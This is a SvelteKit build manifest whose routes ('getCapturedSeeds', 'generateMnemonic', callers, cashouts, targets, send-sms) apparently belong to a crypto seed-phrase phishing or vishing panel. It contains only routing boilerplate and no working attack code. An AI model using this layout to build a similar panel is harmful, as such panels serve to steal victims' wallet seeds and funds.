const manifest = (() => {
function __memo(fn) {
	let value;
	return () => value ??= (value = fn());
}

return {
	appDir: "_app",
	appPath: "_app",
	assets: new Set(["favicon.png","notification.mp3","uploads/testuser/b447d732235cfcacdbc54e5b4f0e5bf1.mp3","uploads/testuser/sound-mappings.json"]),
	mimeTypes: {".png":"image/png",".mp3":"audio/mpeg",".json":"application/json"},
	_: {
		client: {start:"_app/immutable/entry/start.5XwWDpUt.js",app:"_app/immutable/entry/app.BxQrsenL.js",imports:["_app/immutable/entry/start.5XwWDpUt.js","_app/immutable/chunks/B0yxJNGR.js","_app/immutable/chunks/Ck01Vq7Y.js","_app/immutable/chunks/CL1ai2Yl.js","_app/immutable/chunks/BKOYs9ZV.js","_app/immutable/entry/app.BxQrsenL.js","_app/immutable/chunks/CL1ai2Yl.js","_app/immutable/chunks/Ck01Vq7Y.js","_app/immutable/chunks/BKOYs9ZV.js","_app/immutable/chunks/Bzak7iHL.js","_app/immutable/chunks/Cfw8beTg.js","_app/immutable/chunks/RR5R80WA.js"],stylesheets:[],fonts:[],uses_env_dynamic_public:false},
		nodes: [
			__memo(() => import('./chunks/0-DPmuP6R-.js')),
			__memo(() => import('./chunks/1-DXnce19_.js')),
			__memo(() => import('./chunks/2-Bk0sUtBH.js')),
			__memo(() => import('./chunks/3-D3fwOmPK.js')),
			__memo(() => import('./chunks/4-DL9u7QX_.js')),
			__memo(() => import('./chunks/5-CT0csiFT.js')),
			__memo(() => import('./chunks/6-Ch5TwKu-.js')),
			__memo(() => import('./chunks/7-CXwGCEJS.js')),
			__memo(() => import('./chunks/8-BDTYk7OM.js')),
			__memo(() => import('./chunks/9-BWq-6vj9.js'))
		],
		remotes: {
			
		},
		routes: [
			{
				id: "/",
				pattern: /^\/$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 4 },
				endpoint: null
			},
			{
				id: "/admin/api/getGuild",
				pattern: /^\/admin\/api\/getGuild\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-_Akq_DGE.js'))
			},
			{
				id: "/admin/api/login",
				pattern: /^\/admin\/api\/login\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-CUb6qedL.js'))
			},
			{
				id: "/admin/dashboard",
				pattern: /^\/admin\/dashboard\/?$/,
				params: [],
				page: { layouts: [0,2,], errors: [1,,], leaf: 5 },
				endpoint: null
			},
			{
				id: "/admin/login",
				pattern: /^\/admin\/login\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 6 },
				endpoint: null
			},
			{
				id: "/api/capturedData/Add",
				pattern: /^\/api\/capturedData\/Add\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-B9t7mqGs.js'))
			},
			{
				id: "/api/capturedData/Get",
				pattern: /^\/api\/capturedData\/Get\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-QywwgrLM.js'))
			},
			{
				id: "/api/deleteTarg",
				pattern: /^\/api\/deleteTarg\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-D6QdjIKf.js'))
			},
			{
				id: "/api/deleteTarg/all",
				pattern: /^\/api\/deleteTarg\/all\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BNKrDp-N.js'))
			},
			{
				id: "/api/generateMnemonic",
				pattern: /^\/api\/generateMnemonic\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-C1e66dlO.js'))
			},
			{
				id: "/api/guild/addCaller",
				pattern: /^\/api\/guild\/addCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-MHxF1cNZ.js'))
			},
			{
				id: "/api/guild/addDomain",
				pattern: /^\/api\/guild\/addDomain\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DDYzh6Q0.js'))
			},
			{
				id: "/api/guild/deleteCashout",
				pattern: /^\/api\/guild\/deleteCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-ChivvmPs.js'))
			},
			{
				id: "/api/guild/getCallerCashouts",
				pattern: /^\/api\/guild\/getCallerCashouts\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BQm3Z37V.js'))
			},
			{
				id: "/api/guild/getCallerTargets",
				pattern: /^\/api\/guild\/getCallerTargets\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BNiOeJcI.js'))
			},
			{
				id: "/api/guild/getCapturedSeeds",
				pattern: /^\/api\/guild\/getCapturedSeeds\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BYeM69sA.js'))
			},
			{
				id: "/api/guild/getCashouts",
				pattern: /^\/api\/guild\/getCashouts\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DqV_zUAv.js'))
			},
			{
				id: "/api/guild/getDomains",
				pattern: /^\/api\/guild\/getDomains\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-UROCy0fR.js'))
			},
			{
				id: "/api/guild/getGuildCallers",
				pattern: /^\/api\/guild\/getGuildCallers\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-B2M5iIQw.js'))
			},
			{
				id: "/api/guild/getGuild",
				pattern: /^\/api\/guild\/getGuild\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BTdE0Hw_.js'))
			},
			{
				id: "/api/guild/getSettings",
				pattern: /^\/api\/guild\/getSettings\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DhKF_j6N.js'))
			},
			{
				id: "/api/guild/registerCashout",
				pattern: /^\/api\/guild\/registerCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-CjbYY3Yg.js'))
			},
			{
				id: "/api/guild/removeCaller",
				pattern: /^\/api\/guild\/removeCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-D8Yspw16.js'))
			},
			{
				id: "/api/guild/removeDomain",
				pattern: /^\/api\/guild\/removeDomain\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DVwij8KU.js'))
			},
			{
				id: "/api/guild/updateCaller",
				pattern: /^\/api\/guild\/updateCaller\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DdZCZUBt.js'))
			},
			{
				id: "/api/guild/updateCashout",
				pattern: /^\/api\/guild\/updateCashout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-Sx2KdFsP.js'))
			},
			{
				id: "/api/guild/updateSettings",
				pattern: /^\/api\/guild\/updateSettings\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-0wIqFTcQ.js'))
			},
			{
				id: "/api/login",
				pattern: /^\/api\/login\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-ytgG1RLC.js'))
			},
			{
				id: "/api/logout",
				pattern: /^\/api\/logout\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-RhhAIYkD.js'))
			},
			{
				id: "/api/mailer/sendmail/[mailtype]",
				pattern: /^\/api\/mailer\/sendmail\/([^/]+?)\/?$/,
				params: [{"name":"mailtype","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DEDvEbSz.js'))
			},
			{
				id: "/api/register",
				pattern: /^\/api\/register\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-6woB7dCg.js'))
			},
			{
				id: "/api/send-sms",
				pattern: /^\/api\/send-sms\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DrfGUU-o.js'))
			},
			{
				id: "/api/sound/[username]",
				pattern: /^\/api\/sound\/([^/]+?)\/?$/,
				params: [{"name":"username","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-CCZpRKHE.js'))
			},
			{
				id: "/api/startingPage/get",
				pattern: /^\/api\/startingPage\/get\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-5kQdTaix.js'))
			},
			{
				id: "/api/startingPage/set",
				pattern: /^\/api\/startingPage\/set\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-DlfW7Knf.js'))
			},
			{
				id: "/api/targets/[targetid]",
				pattern: /^\/api\/targets\/([^/]+?)\/?$/,
				params: [{"name":"targetid","optional":false,"rest":false,"chained":false}],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-BBYhXqvp.js'))
			},
			{
				id: "/api/upload-sound",
				pattern: /^\/api\/upload-sound\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-zQXBjU8W.js'))
			},
			{
				id: "/dashboard",
				pattern: /^\/dashboard\/?$/,
				params: [],
				page: { layouts: [0,3,], errors: [1,,], leaf: 7 },
				endpoint: null
			},
			{
				id: "/login",
				pattern: /^\/login\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 8 },
				endpoint: null
			},
			{
				id: "/logout",
				pattern: /^\/logout\/?$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 9 },
				endpoint: null
			}
		],
		prerendered_routes: new Set([]),
		matchers: async () => {
			
			return {  };
		},
		server_assets: {}
	}
}
})();

const prerendered = new Set([]);

const base = "";

export { base, manifest, prerendered };
//# sourceMappingURL=manifest.js.map
